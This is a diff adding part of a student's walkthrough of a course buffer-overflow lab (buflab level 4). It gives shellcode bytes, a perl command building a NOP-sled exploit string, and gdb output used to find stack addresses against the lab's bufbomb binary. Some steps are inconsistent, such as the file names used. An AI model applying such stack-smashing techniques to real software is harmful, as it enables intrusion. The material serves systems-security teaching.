@@ -79,3 +79,102 @@ unix> gcc -m32 -c assemblylevel4.s
 unix> objdump -d assemblylevel4.o
 ```
 
+Gives you:
+```
+1016:quinnliu in buflab-handout > objdump -d assemblylevel4.o
+
+assemblylevel4.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:   8d 6c 24 28             lea    0x28(%esp),%ebp
+   4:   b8 0c c7 8c 2d          mov    $0x2d8cc70c,%eax
+   9:   68 2e 8c 04 08          push   $0x8048c2e
+   e:   c3                      ret
+```
+
+Now type:
+```
+unix> perl -e 'print "90 "x505, "8d 6c 24 28 b8 0c c7 8c 2d 68 2e 8c 04 08 c3 ", "30 31 32 33 ", "98 32 68 55 " ' > hexlevel4
+```
+
+
+```
+unix> gdb bufboomb
+(gdb) break getbufn
+(gdb) run -nu quinnliu
+Starting program: /home/ugrads/majors/quinnliu/Desktop/ComputerOrganizationII/buflab-handout/bufbomb -nu quinnliu
+Userid: quinnliu
+Cookie: 0x2d8cc70c
+
+Breakpoint 1, 0x08048bef in getbufn ()
+Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.47.el6_2.5.i686
+(gdb) print /x ($ebp-0x208)
+$1 = 0x55683148 # <=== 1st Address
+(gdb) cont
+Continuing.
+Type string:hello
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x08048bef in getbufn ()
+(gdb) print /x ($ebp-0x208)
+$2 = 0x55683188 # <=== 2nd Address
+(gdb) cont
+Continuing.
+Type string:hello
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x08048bef in getbufn ()
+(gdb) print /x ($ebp-0x208)
+$3 = 0x556831a8 # <=== 3rd Address
+(gdb) cont
+Continuing.
+Type string:hello
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x08048bef in getbufn ()
+(gdb) print /x ($ebp-0x208)
+$4 = 0x55683158 # <=== 4th Address
+(gdb) cont
+Continuing.
+Type string:hello
+Dud: getbufn returned 0x1
+Better luck next time
+
+Breakpoint 1, 0x08048bef in getbufn ()
+(gdb) print /x ($ebp-0x208)
+$5 = 0x55683158 # <=== 5th Address
+```
+
+These are the 5 addresses:
+```
+$1 = 0x55683148 # <=== 1st Address = 1432891720 in base 10
+$2 = 0x55683188 # <=== 2nd Address = 1432891784 in base 10
+$3 = 0x556831a8 # <=== 3rd Address = 1432891816 in base 10
+$4 = 0x55683158 # <=== 4th Address = 1432891736 in base 10
+$5 = 0x55683158 # <=== 5th Address = 1432891736 in base 10
+```
+
+The maximum of the 5 addresses is the 3rd address = 1432891816
+
+Now type:
+```
+unix> ./hex2raw -n < hexlevel4 > raw
+```
+
+Now type:
+```
+unix> ./hex2raw -n < hexlevel4_2 > raw
+unix> gdb bufbomb
+(gdb) run -nu quinnliu < raw
+```
+
+OMG it works!!!
+
+
+
